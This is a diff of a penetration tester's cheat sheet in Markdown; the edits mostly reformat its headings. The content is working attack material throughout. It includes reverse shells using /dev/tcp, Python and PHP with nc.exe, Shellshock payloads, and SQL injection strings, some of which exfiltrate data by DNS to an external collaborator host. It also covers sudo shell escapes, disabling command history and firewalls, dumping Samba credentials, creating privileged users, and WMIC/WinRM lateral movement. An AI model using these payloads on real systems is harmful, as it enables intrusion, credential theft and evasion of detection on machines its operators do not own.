@@ -760,15 +760,15 @@ p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;
 p.waitFor()</td>
 ```
 
-<span id="anchor-83"></span>ShellShock Reverse Shells
+#### <span id="anchor-83"></span>ShellShock Reverse Shells
 
-<span id="anchor-84"></span>Curl - One-Liner
+##### <span id="anchor-84"></span>Curl - One-Liner
 
 ```
 curl -A "() { :;}; echo 'Content-type: text/html'; echo; /bin/ls -al /home/bynarr;" http://192.168.56.101:591/cgi-bin/cat
 ```
 
-<span id="anchor-85"></span>Python Reverse Shell - ShellShock w/Sudo
+##### <span id="anchor-85"></span>Python Reverse Shell - ShellShock w/Sudo
 
 ```
 import requests,sys
@@ -782,9 +782,9 @@ while True:
     print requests.get('http://192.168.56.101:591/cgi-bin/cat', headers=headers).text.strip()</p></td>
 ```
 
-<span id="anchor-86"></span>Python Reverse Shells
+#### <span id="anchor-86"></span>Python Reverse Shells
 
-<span id="anchor-87"></span>Straight Python Shell
+##### <span id="anchor-87"></span>Straight Python Shell
 
 ```
 import socket,os
@@ -800,7 +800,7 @@ stdout_value=stdout.read()+stderr.read()
 so.send(stdout_value)</td>
 ```
 
-<span id="anchor-88"></span>Encode a Python Script (Base64)
+##### <span id="anchor-88"></span>Encode a Python Script (Base64)
 
 ```
 import base64
@@ -810,7 +810,7 @@ with open('<strong>&lt;script_file&gt;</strong>', 'rb') as f:
   print encoded</td>
 ```
 
-<span id="anchor-89"></span>Decode an Encoded Python Script (Base64)
+##### <span id="anchor-89"></span>Decode an Encoded Python Script (Base64)
 
 ```
 import base64; 
@@ -820,9 +820,9 @@ with open('decoded_script.py', 'w') as f:
     f.close()</p></td>
 ```
 
-<span id="anchor-90"></span>Fix TTY Issues In Reverse Shells
+#### <span id="anchor-90"></span>Fix TTY Issues In Reverse Shells
 
-<span id="anchor-91"></span>Python PTY
+##### <span id="anchor-91"></span>Python PTY
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -833,13 +833,13 @@ export TERM=linux
 clear</p></td>
 ```
 
-<span id="anchor-92"></span>Python Sudo w/o TTY
+##### <span id="anchor-92"></span>Python Sudo w/o TTY
 
 ```
 python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(\["/bin/su","-c","id","bynarr"\],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\\n");time.sleep(0.1);print os.read(master,1024);'
 ```
 
-<span id="anchor-93"></span>RDP Via Plink Tunnel
+### <span id="anchor-93"></span>RDP Via Plink Tunnel
 ([*https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html*](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))
 
 From Remote/Compromised Host
@@ -848,9 +848,9 @@ From Remote/Compromised Host
 plink.exe &lt;user&gt;@&lt;ip or domain&gt; -pw &lt;password&gt; -P 22 -2 -4 -T -N -C -R 0.0.0.0:12345:127.0.0.1:3389
 ```
 
-<span id="anchor-94"></span>Shell Escapes (Linux w/sudo)
+### <span id="anchor-94"></span>Shell Escapes (Linux w/sudo)
 
-<span id="anchor-95"></span>vi(m)
+#### <span id="anchor-95"></span>vi(m)
 
 ```
 :!sh
@@ -860,34 +860,33 @@ plink.exe &lt;user&gt;@&lt;ip or domain&gt; -pw &lt;password&gt; -P 22 -2 -4 -T 
 :set shell=/bin/bash:shell
 ```
 
-<span id="anchor-96"></span>nmap --interactive
+#### <span id="anchor-96"></span>nmap --interactive
 
 ```
 !sh
 ```
 
-<span id="anchor-97"></span>awk
+#### <span id="anchor-97"></span>awk
 
 ```
 awk 'BEGIN {system(\\"/bin/bash\\")}'
 ```
 
-<span id="anchor-98"></span>perl
+#### <span id="anchor-98"></span>perl
 
 ```
 perl -e 'exec \\"/bin/bash\\";'
 ```
 
-<span id="anchor-99"></span>find
+#### <span id="anchor-99"></span>find
 
 ```
 find / -exec /usr/bin/awk 'BEGIN {system(\\"/bin/bash\\")}' \\\\;
 ```
 
-<span id="anchor-100"></span>X Server Hacks
+### <span id="anchor-100"></span>X Server Hacks
 
-<span id="anchor-101"></span>How to Run An Application As An
-Unprivileged User (i.e. WireShark)
+#### <span id="anchor-101"></span>How to Run An Application As An Unprivileged User (i.e. WireShark)
 
 This script will allow you to run an application as an unprivileged user
 
@@ -899,9 +898,9 @@ xhost +SI:localuser:<strong>&lt;username&gt;</strong>
 sudo -u<strong> &lt;username&gt; &lt;command and args&gt;</strong></p></td>
 ```
 
-<span id="anchor-102"></span>Kali Hacks
+#### <span id="anchor-102"></span>Kali Hacks
 
-<span id="anchor-103"></span>Configure Wireshark to Run As a
+##### <span id="anchor-103"></span>Configure Wireshark to Run As a
 Non-Privileged User
 
 These steps will create a group called wireshark that will be granted
@@ -915,7 +914,7 @@ system and make them a member of the group.
 <strong>root@kali:~#</strong> setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</p></td>
 ```
 
-<span id="anchor-104"></span>Configure Pure-FTP to Serve Files
+##### <span id="anchor-104"></span>Configure Pure-FTP to Serve Files
 
 This script will create a user and group for pure-ftp as well restart
 the service.
@@ -934,9 +933,9 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart</p></td>
 ```
 
-<span id="anchor-105"></span>Useful Scripts
+### <span id="anchor-105"></span>Useful Scripts
 
-<span id="anchor-106"></span>Pull the Google Hacking Database (GHDB)
+#### <span id="anchor-106"></span>Pull the Google Hacking Database (GHDB)
 Into a CSV File
 
 This will pull the GHDB down into a CSV file. You will need to replace
@@ -957,7 +956,7 @@ for ((i = 2; i&lt;=4299; i++)); do
 done</p></td>
 ```
 
-<span id="anchor-107"></span>Zone Transfer (Bash)
+#### <span id="anchor-107"></span>Zone Transfer (Bash)
 
 This script will locate the NS servers and attempt to use the “host”
 command to perform a zone transfer.
@@ -973,7 +972,7 @@ done
 fi</p></td>
 ```
 
-<span id="anchor-108"></span>PHP RFI Reverse Shell
+#### <span id="anchor-108"></span>PHP RFI Reverse Shell
 
 This can be used in a RFI/LFI to download nc.exe from the specified
 server then run it.
@@ -991,13 +990,13 @@ Using exec() to change directories and run a file uploaded elsewhere.
 &lt;?php exec('cd uploads && nc.exe -nv **&lt;server&gt; &lt;port&gt;** -e cmd.exe');?&gt;
 ```
 
-<span id="anchor-109"></span>Type Juggling
+### <span id="anchor-109"></span>Type Juggling
 
-<span id="anchor-110"></span>PHP Loose Comparison
+#### <span id="anchor-110"></span>PHP Loose Comparison
 
 -   [*https://www.php.net/manual/en/types.comparisons.php*](https://www.php.net/manual/en/types.comparisons.php)
 
-<span id="anchor-111"></span>PHP String Conversions
+#### <span id="anchor-111"></span>PHP String Conversions
 
 PHP duplicated the string conversion method used by Unix's strtod
 command. Using this type of string conversion with Loose comparisons
@@ -1006,9 +1005,9 @@ could lead to type juggling.
 -   [*https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion*](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)
 -   [*http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html*](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)
 
-<span id="anchor-112"></span>SQL Injection
+### <span id="anchor-112"></span>SQL Injection
 
-<span id="anchor-113"></span>SQL Tests
+#### <span id="anchor-113"></span>SQL Tests
 
 |            |            |             |             |             |              |
 |------------|------------|-------------|-------------|-------------|--------------|
@@ -1020,120 +1019,120 @@ could lead to type juggling.
 | ")"a"="a"  | ')'a'='a   | 'or"='      | ' or 1=1--  | " or 1=1--  | or 1=1--     |
 | " or 1=1\# |            |             |             |             |              |
 
-<span id="anchor-114"></span>SQL Comment Formats
+#### <span id="anchor-114"></span>SQL Comment Formats
 
-<span id="anchor-115"></span>Microsoft SQL/PostgreSQL v1
+##### <span id="anchor-115"></span>Microsoft SQL/PostgreSQL v1
 
 ```
 --comment
 ```
 
-<span id="anchor-116"></span>Microsoft SQL/PostgreSQL v1
+##### <span id="anchor-116"></span>Microsoft SQL/PostgreSQL v1
 
 ```
 /\*comment\*/
 ```
 
-<span id="anchor-117"></span>Oracle v1
+##### <span id="anchor-117"></span>Oracle v1
 
 ```
 --comment
 ```
 
-<span id="anchor-118"></span>MySQL v1 (Note the space)
+##### <span id="anchor-118"></span>MySQL v1 (Note the space)
 
 ```
 -- comment
 ```
 
-<span id="anchor-119"></span>MySQL v2
+##### <span id="anchor-119"></span>MySQL v2
 
 ```
 \#comment
 ```
 
-<span id="anchor-120"></span>MySQL v3
+##### <span id="anchor-120"></span>MySQL v3
 
 ```
 /\*comment\*/
 ```
 
-<span id="anchor-121"></span>SQL String Concatenation
+#### <span id="anchor-121"></span>SQL String Concatenation
 
-<span id="anchor-122"></span>Oracle & PostgreSQL
+##### <span id="anchor-122"></span>Oracle & PostgreSQL
 
 ```
 'foo'\|\|'bar'
 ```
 
-<span id="anchor-123"></span>MySQL
+##### <span id="anchor-123"></span>MySQL
 
 ```
 'foo' 'bar'
 CONCAT('foo','bar')</p></td>
 ```
 
-<span id="anchor-124"></span>Microsoft
+##### <span id="anchor-124"></span>Microsoft
 
 ```
 'foo'+'bar'
 ```
 
-<span id="anchor-125"></span>SQL Time Delays
+#### <span id="anchor-125"></span>SQL Time Delays
 
-<span id="anchor-126"></span>Oracle
+##### <span id="anchor-126"></span>Oracle
 
 ```
 dbms\_pipe.receive\_message(('a'),10)
 ```
 
-<span id="anchor-127"></span>Microsoft
+##### <span id="anchor-127"></span>Microsoft
 
 ```
 WAITFOR DELAY '0:0:10'
 ```
 
-<span id="anchor-128"></span>PostgreSQL
+##### <span id="anchor-128"></span>PostgreSQL
 
 ```
 SELECT pg\_sleep(10)
 ```
 
-<span id="anchor-129"></span>MySQL
+##### <span id="anchor-129"></span>MySQL
 
 ```
 SELECT sleep(10)
 ```
 
-<span id="anchor-130"></span>SQL Conditional Time Delays
+#### <span id="anchor-130"></span>SQL Conditional Time Delays
 
-<span id="anchor-131"></span>Oracle
+##### <span id="anchor-131"></span>Oracle
 
 ```
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms\_pipe.receive\_message(('a'),10) ELSE NULL END FROM dual
 ```
 
-<span id="anchor-132"></span>Microsoft
+##### <span id="anchor-132"></span>Microsoft
 
 ```
 IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
 ```
 
-<span id="anchor-133"></span>PostgreSQL
+##### <span id="anchor-133"></span>PostgreSQL
 
 ```
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END
 ```
 
-<span id="anchor-134"></span>MySQL
+##### <span id="anchor-134"></span>MySQL
 
 ```
 SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
 ```
 
-<span id="anchor-135"></span>SQL DNS Lookup
+#### <span id="anchor-135"></span>SQL DNS Lookup
 
-<span id="anchor-136"></span>Oracle
+##### <span id="anchor-136"></span>Oracle
 
 ```
 SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual
@@ -1141,40 +1140,40 @@ Or
 SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</p></td>
 ```
 
-<span id="anchor-137"></span>Microsoft
+##### <span id="anchor-137"></span>Microsoft
 
 ```
 exec master..xp\_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
 ```
 
-<span id="anchor-138"></span>PostgreSQL
+##### <span id="anchor-138"></span>PostgreSQL
 
 ```
 copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
 ```
 
-<span id="anchor-139"></span>MySQL (Windows only)
+##### <span id="anchor-139"></span>MySQL (Windows only)
 
 ```
 LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
 SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</p></td>
 ```
 
-<span id="anchor-140"></span>SQL DNS Lookup w/Data Exfiltration
+#### <span id="anchor-140"></span>SQL DNS Lookup w/Data Exfiltration
 
-<span id="anchor-141"></span>Oracle
+##### <span id="anchor-141"></span>Oracle
 
 ```
 SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root \[ &lt;!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;\]&gt;'),'/l') FROM dual
 ```
 
-<span id="anchor-142"></span>Microsoft
+##### <span id="anchor-142"></span>Microsoft
 
 ```
 declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp\_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
 ```
 
-<span id="anchor-143"></span>PostgreSQL
+##### <span id="anchor-143"></span>PostgreSQL
 
 ```
 create OR replace function f() returns void as $$
@@ -1189,52 +1188,51 @@ $$ language plpgsql security definer;
 SELECT f();</p></td>
 ```
 
-<span id="anchor-144"></span>MySQL (Windows only)
+##### <span id="anchor-144"></span>MySQL (Windows only)
 
 ```
 SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'
 ```
 
-<span id="anchor-145"></span>SQL Database Enumeration Examples
+#### <span id="anchor-145"></span>SQL Database Enumeration Examples
 
-<span id="anchor-146"></span>Discover Database Version (Microsoft SQL,
-MySQL)
+##### <span id="anchor-146"></span>Discover Database Version (Microsoft SQL, MySQL)
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,@@version,6
 ```
 
-<span id="anchor-147"></span>Discover Database Version v1 (Oracle)
+##### <span id="anchor-147"></span>Discover Database Version v1 (Oracle)
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,v$version,6
 ```
 
-<span id="anchor-148"></span>Discover Database Version v2 (Oracle)
+##### <span id="anchor-148"></span>Discover Database Version v2 (Oracle)
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,banner,6 FROM v$version
 ```
 
-<span id="anchor-149"></span>Discover Database Version v3 (Oracle)
+##### <span id="anchor-149"></span>Discover Database Version v3 (Oracle)
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,version,6 FROM v$instance
 ```
 
-<span id="anchor-150"></span>Discover Database Version (PostgreSQL)
+##### <span id="anchor-150"></span>Discover Database Version (PostgreSQL)
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,version(),6
 ```
 
-<span id="anchor-151"></span>Discover Database User
+##### <span id="anchor-151"></span>Discover Database User
 
 ```
 http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,user(),6
 ```
 
-<span id="anchor-152"></span>Enumerating Table Names (MySQL, Microsoft
+##### <span id="anchor-152"></span>Enumerating Table Names (MySQL, Microsoft
 SQL)
 
 This example is injecting a “union all select” statement to place the
@@ -1248,7 +1246,7 @@ http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,table\_nam
 %' and 1=0 union select null, table\_name from information\_schema.tables \#
 ```
 
-<span id="anchor-153"></span>Enumerating Column Names of a Table (MySQL,
+##### <span id="anchor-153"></span>Enumerating Column Names of a Table (MySQL,
 Microsoft SQL)
 
 This example is injecting a “union all select” statement to list the
@@ -1262,47 +1260,47 @@ http://**&lt;server&gt;**/**&lt;somefile&gt;**.php?**&lt;somevariable&gt;**=**&l
 %' and 1=0 union select null, column\_name from information\_schema.columns where table\_name = 'users' \#”
 ```
 
-<span id="anchor-154"></span>Enumerating Table Names (Oracle)
+##### <span id="anchor-154"></span>Enumerating Table Names (Oracle)
 
 ```
 SELECT table\_name FROM all\_tables
 ```
 
-<span id="anchor-155"></span>Enumerating Column Names (Oracle)
+##### <span id="anchor-155"></span>Enumerating Column Names (Oracle)
 
 ```
 SELECT column\_name FROM all\_tab\_columns WHERE table\_name = '**&lt;table\_name&gt;**'
 ```
 
-<span id="anchor-156"></span>Collecting Specific Information
+##### <span id="anchor-156"></span>Collecting Specific Information
 
 ```
 %' UNION SELECT user, password from users \#
 ```
 
-<span id="anchor-157"></span>Error Based Blind Enumeration
+#### <span id="anchor-157"></span>Error Based Blind Enumeration
 
-<span id="anchor-158"></span>Enumerate Database Name
+##### <span id="anchor-158"></span>Enumerate Database Name
 
 ```
 1 AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR), 0x20)),1,1))&gt;1
 ```
 
-<span id="anchor-159"></span>Enumerate Table Name
+##### <span id="anchor-159"></span>Enumerate Table Name
 
 ```
 1 AND ORD(MID((SELECT IFNULL(CAST(table\_name AS CHAR),0x20) FROM information\_schema.tables WHERE table\_schema=database() ORDER BY table\_name LIMIT 0,1),1,1))&gt;1
 ```
 
-<span id="anchor-160"></span>Enumerate Column Name
+##### <span id="anchor-160"></span>Enumerate Column Name
 
 ```
 1 AND ORD(MID((SELECT IFNULL(CAST(column\_name AS CHAR),0x20) FROM information\_schema.columns WHERE table\_name=0x6775657374626f6f6b ORDER BY column\_name LIMIT 0,1),1,1))&gt;1
 ```
 
-<span id="anchor-161"></span>Enumerate Field Value
+##### <span id="anchor-161"></span>Enumerate Field Value
 
-Explaination:
+Explanation:
 
 -   ORD(string) - Returns the leftmost character in a string
 -   MID(string, position, length) - Extracts a substring, returns 5th
@@ -1324,50 +1322,49 @@ is NULL/non-existent.
 1 AND ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),5,1))&gt;1
 ```
 
-<span id="anchor-162"></span>Linux Commands
+### <span id="anchor-162"></span>Linux Commands
 
-<span id="anchor-163"></span>Disable Command History
+#### <span id="anchor-163"></span>Disable Command History
 
 ```
 unset HISTFILE
 ```
 
-<span id="anchor-164"></span>Check Linux Distribution
+#### <span id="anchor-164"></span>Check Linux Distribution
 
-<span id="anchor-165"></span>Method 1
+##### <span id="anchor-165"></span>Method 1
 
 ```
 cat /etc/\*-release
 ```
 
-<span id="anchor-166"></span>Method 2
+##### <span id="anchor-166"></span>Method 2
 
 ```
 Lsb\_release -a
 ```
 
-<span id="anchor-167"></span>Remove All Lines with non-ASCII Characters
+#### <span id="anchor-167"></span>Remove All Lines with non-ASCII Characters
 
 ```
 perl -nle 'print if m{^\[\[:ascii:\]\]+$}' **&lt;inputfile&gt;**
 ```
 
-<span id="anchor-168"></span>Remove All Lines with ASCII Characters
+#### <span id="anchor-168"></span>Remove All Lines with ASCII Characters
 
 ```
 perl -nle 'print if !m{^\[\[:ascii:\]\]+$}' **&lt;inputfile&gt;**
 ```
 
-<span id="anchor-169"></span>Convert From Windows(dos) to Unix File
-Format
+### <span id="anchor-169"></span>Convert From Windows(dos) to Unix File Format
 
-<span id="anchor-170"></span>dos2unix
+##### <span id="anchor-170"></span>dos2unix
 
 ```
 dos2unix **&lt;filename&gt;**
 ```
 
-<span id="anchor-171"></span>vi(m)
+##### <span id="anchor-171"></span>vi(m)
 
 ```
 :1,$s/^M//g
@@ -1376,25 +1373,25 @@ dos2unix **&lt;filename&gt;**
 To enter “^M” press <strong>CTRL+V</strong> then <strong>Enter</strong></p></td>
 ```
 
-<span id="anchor-172"></span>awk
+##### <span id="anchor-172"></span>awk
 
 ```
 awk '{ sub("\\r$", ""); print }' **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
 ```
 
-<span id="anchor-173"></span>perl
+##### <span id="anchor-173"></span>perl
 
 ```
 perl -p -e 's/\\r$//' &lt; **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
 ```
 
-<span id="anchor-174"></span>tr
+##### <span id="anchor-174"></span>tr
 
 ```
 tr -d '\\15\\32' &lt; **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
 ```
 
-<span id="anchor-175"></span>Dump Samba Credentials
+#### <span id="anchor-175"></span>Dump Samba Credentials
 
 ```
 pdbdump -Lw
@@ -1404,7 +1401,7 @@ pdbdump -Lw
 pbtool **&lt;file&gt;** dump
 ```
 
-<span id="anchor-176"></span>Execute Commands Without Spaces (Examples)
+#### <span id="anchor-176"></span>Execute Commands Without Spaces (Examples)
 
 ```
 IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd`
@@ -1415,37 +1412,37 @@ cat&lt;/etc/passwd
 X=$'cat\x20/etc/passwd'&amp;&amp;$X</td>
 ```
 
-<span id="anchor-177"></span>Windows Commands
+### <span id="anchor-177"></span>Windows Commands
 
-<span id="anchor-178"></span>PowerShell
+#### <span id="anchor-178"></span>PowerShell
 
-<span id="anchor-179"></span>Encoding Commands from File (Linux)
+##### <span id="anchor-179"></span>Encoding Commands from File (Linux)
 
 ```
 iconv -f ASCII -t UTF-16LE **&lt;file&gt;** \| base64 -w 0
 ```
 
-<span id="anchor-180"></span>Encoding Commands from Inline (Linux)
+##### <span id="anchor-180"></span>Encoding Commands from Inline (Linux)
 
 ```
 echo "**&lt;command&gt;**" \| iconv -t UTF-16LE \| base64 -w 0
 ```
 
-<span id="anchor-181"></span>Encoding Commands with Python
+##### <span id="anchor-181"></span>Encoding Commands with Python
 
 ```
 from base64 import b64encode
 b64encode('<strong>&lt;command&gt;</strong>').encode('UTF-16LE')</p></td>
 ```
 
-<span id="anchor-182"></span>Encoding Commands with Ruby
+##### <span id="anchor-182"></span>Encoding Commands with Ruby
 
 ```
 require "base64"
 Base64.encode64('<strong>&lt;command&gt;</strong>'.force_encoding('UTF-16LE'))</p></td>
 ```
 
-<span id="anchor-183"></span>Checking for Access Level
+##### <span id="anchor-183"></span>Checking for Access Level
 
 <span id="anchor-184"></span>Check Username
 
@@ -1453,269 +1450,264 @@ Base64.encode64('<strong>&lt;command&gt;</strong>'.force_encoding('UTF-16LE'))</
 Echo %USERNAME%
 ```
 
-<span id="anchor-185"></span>Use DIR to Check For Admin Rights
+##### <span id="anchor-185"></span>Use DIR to Check For Admin Rights
 
 ```
 dir \\\\**&lt;host&gt;**\\C$
 ```
 
-<span id="anchor-186"></span>Use AT to Check For Admin Rights
+##### <span id="anchor-186"></span>Use AT to Check For Admin Rights
 
 ```
 at \\\\**&lt;host&gt;**
 ```
 
-<span id="anchor-187"></span>System Details
+#### <span id="anchor-187"></span>System Details
 
-<span id="anchor-188"></span>Discover Domain (workstation)
-
-```
-net config workstation
-```
-
-<span id="anchor-189"></span>Discover Domain (server)
+##### <span id="anchor-188"></span>Discover Domain (workstation)
 
 ```
 net config workstation
 ```
 
-<span id="anchor-190"></span>View Domain Controller Name Via Registry
+##### <span id="anchor-189"></span>Discover Domain (server)
+
+```
+net config workstation
+```
+
+##### <span id="anchor-190"></span>View Domain Controller Name Via Registry
 
 ```
 reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\History" /v DCName
 ```
 
-<span id="anchor-191"></span>Check Patch Level
+##### <span id="anchor-191"></span>Check Patch Level
 
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
-<span id="anchor-192"></span>Check for Specific Installed Path
+##### <span id="anchor-192"></span>Check for Specific Installed Path
 
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn \| findstr /C:"**&lt;kbnumber&gt;**"
 ```
 
-<span id="anchor-193"></span>Get Drive Details
+##### <span id="anchor-193"></span>Get Drive Details
 
 ```
 wmic logicaldisk get caption,description,providername
 ```
 
-<span id="anchor-194"></span>Firewall
+#### <span id="anchor-194"></span>Firewall
 
-<span id="anchor-195"></span>Disable Firewall (Windows XP)
+##### <span id="anchor-195"></span>Disable Firewall (Windows XP)
 
 ```
 netsh firewall set opmode disable
 ```
 
-<span id="anchor-196"></span>Enable Firewall (Windows XP)
+##### <span id="anchor-196"></span>Enable Firewall (Windows XP)
 
 ```
 netsh firewall set opmode enable
 ```
 
-<span id="anchor-197"></span>Disable Firewall (Windows Vista, Requires
-Elevation, UAC)
+##### <span id="anchor-197"></span>Disable Firewall (Windows Vista, Requires Elevation, UAC)
 
 ```
 netsh advfirewall set currentprofile state off
 ```
 
-<span id="anchor-198"></span>Enable Firewall (Windows Vista, Requires
-Elevation, UAC)
+##### <span id="anchor-198"></span>Enable Firewall (Windows Vista, Requires Elevation, UAC)
 
 ```
 netsh advfirewall set currentprofile state on
 ```
 
-<span id="anchor-199"></span>Check Firewall Status (Windows Vista &
+##### <span id="anchor-199"></span>Check Firewall Status (Windows Vista &
 Newer)
 
 ```
 netsh advfirewall firewall dump
 ```
 
-<span id="anchor-200"></span>Check Firewall Status (Windows XP)
+##### <span id="anchor-200"></span>Check Firewall Status (Windows XP)
 
 ```
 netsh firewall show state
 ```
 
-<span id="anchor-201"></span>Show Firewall Configuration (Windows XP)
+##### <span id="anchor-201"></span>Show Firewall Configuration (Windows XP)
 
 ```
 Netsh firewall show config
 ```
 
-<span id="anchor-202"></span>User & Group Commands
+#### <span id="anchor-202"></span>User & Group Commands
 
-<span id="anchor-203"></span>Current User Privileges
+##### <span id="anchor-203"></span>Current User Privileges
 
 ```
 whoami /priv
 ```
 
-<span id="anchor-204"></span>Current User Groups
+##### <span id="anchor-204"></span>Current User Groups
 
 ```
 whoami /groups
 ```
 
-<span id="anchor-205"></span>User Details (local)
+##### <span id="anchor-205"></span>User Details (local)
 
 ```
 net user **&lt;username&gt;**
 ```
 
-<span id="anchor-206"></span>User Details (domain)
+##### <span id="anchor-206"></span>User Details (domain)
 
 ```
 net user **&lt;username&gt;** /domain
 ```
 
-<span id="anchor-207"></span>Create a User
+##### <span id="anchor-207"></span>Create a User
 
 ```
 net user **&lt;username&gt;** **&lt;password&gt;** /ADD
 ```
 
-<span id="anchor-208"></span>Add a User to a Group
+##### <span id="anchor-208"></span>Add a User to a Group
 
 ```
 net localgroup **&lt;groupname&gt;** **&lt;username&gt;** /add
 ```
 
-<span id="anchor-209"></span>Find Domain Admins
+##### <span id="anchor-209"></span>Find Domain Admins
 
 ```
 net group "Domain Admins" /domain
 ```
 
-<span id="anchor-210"></span>Find Enterprise Admins
+##### <span id="anchor-210"></span>Find Enterprise Admins
 
 ```
 net group “Enterprise Admins” /domain
 ```
 
-<span id="anchor-211"></span>List Local Groups
+##### <span id="anchor-211"></span>List Local Groups
 
 ```
 net localgroup
 ```
 
-<span id="anchor-212"></span>List Local Group Members
+##### <span id="anchor-212"></span>List Local Group Members
 
 ```
 net localgroup **&lt;groupname&gt;**
 ```
 
-<span id="anchor-213"></span>List Local Password Policy
+##### <span id="anchor-213"></span>List Local Password Policy
 
 ```
 net accounts
 ```
 
-<span id="anchor-214"></span>List Domain Password Policy
+##### <span id="anchor-214"></span>List Domain Password Policy
 
 ```
 net accounts /domain
 ```
 
-<span id="anchor-215"></span>Command Execution
+#### <span id="anchor-215"></span>Command Execution
 
-<span id="anchor-216"></span>WMIC Execute a Command (Admin)
+##### <span id="anchor-216"></span>WMIC Execute a Command (Admin)
 
 ```
 wmic /node:”**&lt;host&gt;**” process call create “**&lt;program&gt;**”
 ```
 
-<span id="anchor-217"></span>PowerShell Execute a Command (Admin, WinRM,
-Port 5985)
+##### <span id="anchor-217"></span>PowerShell Execute a Command (Admin, WinRM, Port 5985)
 
 ```
 Invoke-Command -ComputerName **&lt;host&gt;** -ScriptBlock { **&lt;command&gt;** }
 ```
 
-<span id="anchor-218"></span>PowerSploit Execute a Command (Admin,
-Non-Bind)
+##### <span id="anchor-218"></span>PowerSploit Execute a Command (Admin, Non-Bind)
 
 ```
 Invoke-WmiCommand -ComputerName **&lt;target&gt;** -Payload { **&lt;command&gt;** } \| select -exp “PayloadOutput”
 ```
 
-<span id="anchor-219"></span>PowerShell Execution of SCT File Using .NET
-Assemblies
+##### <span id="anchor-219"></span>PowerShell Execution of SCT File Using .NET Assemblies
 
 ```
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');
 [Microsoft.Jscript.Eval]::JScriptEvaluate('GetObject("script:<strong>&lt;SCT_URL&gt;</strong>").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());</p></td>
 ```
 
-<span id="anchor-220"></span>Lateral Movement
+##### <span id="anchor-220"></span>Lateral Movement
 
-<span id="anchor-221"></span>Create Service w/WINRM.EXE
+##### <span id="anchor-221"></span>Create Service w/WINRM.EXE
 
 ```
 winrm invoke Create wmicimv2/Win32_Service @{Name="<strong>&lt;name&gt;</strong>";DisplayName="<strong>&lt;name&gt;</strong>";PathName="<strong>&lt;command&gt;</strong>"} -r:http://<strong>&lt;hostname&gt;</strong>:5985
 winrm invoke StartService wmicimv2/Win32_Service?Name=<strong>&lt;name&gt;</strong> -r:http://<strong>&lt;hostname&gt;</strong>:5985</p></td>
 ```
 
-<span id="anchor-222"></span>Processes
+#### <span id="anchor-222"></span>Processes
 
-<span id="anchor-223"></span>PowerShell - Get-Process
+##### <span id="anchor-223"></span>PowerShell - Get-Process
 
 ```
 Get-Process
 ```
 
-<span id="anchor-224"></span>TaskList List Processes
+##### <span id="anchor-224"></span>TaskList List Processes
 
 ```
 tasklist /v /S **&lt;host&gt;**
 ```
 
-<span id="anchor-225"></span>TaskList Kill Processes
+##### <span id="anchor-225"></span>TaskList Kill Processes
 
 ```
 tasklist /S **&lt;host&gt;** /PID **&lt;pid&gt;** /F
 ```
 
-<span id="anchor-226"></span>Find a Specific Processes Information
+##### <span id="anchor-226"></span>Find a Specific Processes Information
 
 ```
 tasklist \| findstr /i “**&lt;process\_name&gt;**”
 ```
 
